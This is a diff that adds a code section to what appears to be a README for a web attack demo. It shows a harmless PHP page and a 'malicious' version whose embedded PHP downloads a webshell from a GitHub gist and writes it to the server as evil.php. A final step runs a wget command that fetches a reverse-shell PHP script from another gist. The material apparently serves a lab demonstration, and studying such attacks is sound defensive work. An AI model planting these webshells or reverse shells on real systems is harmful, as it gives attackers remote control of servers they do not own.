@@ -55,3 +55,42 @@ Environment
   
 **Attacker Remote**
 >Any machine with a webbrowser
+  
+Code
+----
+**Good getevil.php**
+```<html>
+<head>
+<title>I'm a Good Web Page</title>
+</head>
+<body>
+I'm a Good Web Page
+</body>
+</html>
+```  
+  
+** Malicious getevil.php*
+```
+<html> 
+<head> 
+<title>I'm a Bad Web Page</title> 
+</head> 
+<body> 
+I'm a Bad Web Page 
+
+<?php // Normal code  echo "Whatsupppp";   
+// start of evil code 
+$code = file_get_contents("https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/9377612eeea89aed2b226a870e76ac12965d6694/easy-simple-php-webshell.php"); 
+$myfile = fopen("evil.php", "w+") or die("Unable to open file!");   
+fwrite($myfile, $code);  
+fclose($myfile);  
+// end of evil code  ?>
+</body> 
+</html>  
+```  
+
+**Download Reverse Shell**
+```
+wget https://gist.githubusercontent.com/scottbrumley/cd76c1e61e168a5a4e8c7251fa8e8c82/raw/224af483fd976654c29f1eed9242a233437a6dad/reverse-shell.php
+```  
+  
